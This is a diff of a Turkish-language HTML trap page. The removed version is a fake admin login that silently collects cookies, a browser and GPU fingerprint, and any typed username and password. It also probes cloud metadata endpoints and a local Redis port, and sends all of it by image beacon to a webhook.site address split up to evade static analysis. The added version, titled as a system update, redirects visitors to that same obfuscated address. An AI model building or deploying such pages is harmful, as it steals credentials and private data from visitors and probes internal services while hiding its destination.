@@ -1,131 +1,30 @@
 <!DOCTYPE html>
-<html lang="tr">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Dashboard - Critical Login</title>
-    <meta name="robots" content="noindex, nofollow">
-
-    <style>
-        body { font-family: 'Courier New', monospace; background: #111; color: #0f0; padding: 20px; text-align: center; }
-        .box { border: 1px solid #333; padding: 20px; margin: 20px auto; max-width: 600px; background: #000; }
-        h1 { color: #f00; }
-        .btn { background: #d00; color: #fff; padding: 15px 30px; border: none; font-size: 16px; cursor: pointer; text-decoration: none; display: inline-block; margin: 10px; }
-        .btn:hover { background: #f00; }
-        input { padding: 10px; width: 80%; margin: 10px 0; background: #222; border: 1px solid #555; color: #fff; }
-        
-        /* GÖRÜNMEZ TUZAK ALANI */
-        #stealth-layer { position: absolute; width: 1px; height: 1px; opacity: 0; overflow: hidden; top: -1000px; }
-    </style>
+    <title>Sistem Güncellemesi</title>
 </head>
 <body>
-
-    <div class="box">
-        <h1>⚠️ GÜVENLİ ALAN ⚠️</h1>
-        <p>Sistem tespiti yapıldı. Lütfen kimliğinizi doğrulayın.</p>
-        
-        <input type="text" id="fake_user" placeholder="Admin Username">
-        <input type="password" id="fake_pass" placeholder="Password">
-        <br>
-        <a href="#" class="btn" onclick="manualTrigger('Login_Attempt')">GİRİŞ YAP</a>
-        <br><br>
-        <a href="#" style="color:#555; font-size:10px;" onclick="manualTrigger('Forgot_Pass_Click')">Şifremi Unuttum</a>
-    </div>
-
-    <div id="stealth-layer">
-        <img src="http://169.254.169.254/latest/meta-data/" onerror="reportProbe('AWS_Meta_Block')" onload="reportProbe('AWS_Meta_OPEN_CRITICAL')">
-        <img src="http://metadata.google.internal/computeMetadata/v1/" onerror="reportProbe('GCP_Meta_Block')" onload="reportProbe('GCP_Meta_OPEN_CRITICAL')">
-        <img src="http://127.0.0.1:6379" onerror="reportProbe('Redis_Port_Closed')" onload="reportProbe('Redis_Port_OPEN')">
-    </div>
-
+    <h1>Lütfen Bekleyin...</h1>
+    
     <script>
-        // --- 1. URL GİZLEME (Botun statik analizini atlatmak için) ---
-        // URL'i parçalara böldük ki bot kodu okuyarak linki bulamasın, mecbur çalıştırsın.
-        const _p1 = "https://web";
-        const _p2 = "hook.site/";
-        const _p3 = "85d0aa21-bac7-436a-bd91-bacacdcca904";
-        const ENDPOINT = _p1 + _p2 + _p3;
-
-        // --- 2. VERİ GÖNDERME MOTORU ---
-        function exfiltrate(label, dataObj) {
-            // Veriyi JSON yap, String'e çevir ve Base64 ile şifrele (URL bozulmasın diye)
-            const payload = btoa(unescape(encodeURIComponent(JSON.stringify(dataObj))));
-            
-            // Image Beacon tekniği (Sessiz GET isteği)
-            const img = new Image();
-            img.src = `${ENDPOINT}?cat=${label}&data=${payload}&t=${Date.now()}`;
-            console.log("Data sent: " + label);
-        }
-
-        // --- 3. SİSTEM BİLGİLERİNİ TOPLA ---
-        function gatherSystemIntel() {
-            let intel = {
-                // Temel Bilgiler
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                cookies: document.cookie || "No_Cookies_Found",
-                referrer: document.referrer || "Direct_Access",
-                
-                // Donanım Parmak İzi
-                cores: navigator.hardwareConcurrency || "unknown",
-                ram: navigator.deviceMemory || "unknown",
-                screen: screen.width + "x" + screen.height,
-                colorDepth: screen.colorDepth,
-                
-                // Zaman ve Ağ
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                online: navigator.onLine,
-                connection: navigator.connection ? navigator.connection.effectiveType : "unknown"
-            };
-
-            // WebGL (Ekran Kartı) Bilgisi - Bot Tespitinde 1 Numaradır
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (gl) {
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    intel.gpu_vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-                    intel.gpu_renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                }
-            } catch (e) { intel.gpu_error = e.message; }
-
-            return intel;
-        }
-
-        // --- 4. SSRF & PORT TARAMA RAPORU ---
-        function reportProbe(status) {
-            exfiltrate("SSRF_PROBE", { status: status });
-        }
-
-        // --- 5. MANUEL TETİKLEYİCİ (Butonlar İçin) ---
-        function manualTrigger(actionName) {
-            const inputUser = document.getElementById('fake_user').value;
-            const inputPass = document.getElementById('fake_pass').value;
-            
-            exfiltrate("USER_INTERACTION", {
-                action: actionName,
-                input_user: inputUser,
-                input_pass: inputPass // Eğer bot form doldurursa şifreyi çalarız
-            });
-            alert("Bağlantı hatası! Lütfen tekrar deneyin."); // Botu oyalamak için
-        }
-
-        // --- 6. BAŞLATMA (Sayfa Yüklenince Ateşle) ---
-        window.onload = function() {
-            // Hemen sistem bilgilerini gönder
-            const sysData = gatherSystemIntel();
-            exfiltrate("SYSTEM_INFO", sysData);
-
-            // Sahte bir Cookie oluşturup geri okumayı dene (Botun cookie desteğini test et)
-            document.cookie = "Trap_Cookie=Session_Active_123; path=/";
-            if (document.cookie.indexOf("Trap_Cookie") !== -1) {
-                exfiltrate("COOKIE_TEST", { status: "Cookies_Enabled", val: document.cookie });
-            } else {
-                exfiltrate("COOKIE_TEST", { status: "Cookies_Disabled" });
-            }
-        };
-
+        // 1. URL'i Parçala (Bot okuyamasın)
+        // Normalde "webhook.site/..." diye aratırlar. Biz bunu bozuyoruz.
+        var a = "https://";
+        var b = "web";
+        var c = "hook.";
+        var d = "site/";
+        var e = "85d0aa21-bac7-436a-bd91-bacacdcca904"; // UUID kısmını da bölebilirsin
+        
+        // 2. Tarayıcıda Birleştir (Sadece JS çalıştıran bot görebilir)
+        var fullUrl = a + b + c + d + e;
+        
+        // 3. Botu Oraya Gönder (Redirect)
+        // "?source=js_redirect" ekliyoruz ki tuzağa düştüğünü anlayalım.
+        window.location.href = fullUrl + "?source=js_forced_redirect";
     </script>
+
+    <noscript>
+        <a href="https://google.com">Devam Et</a>
+    </noscript>
 </body>
 </html>
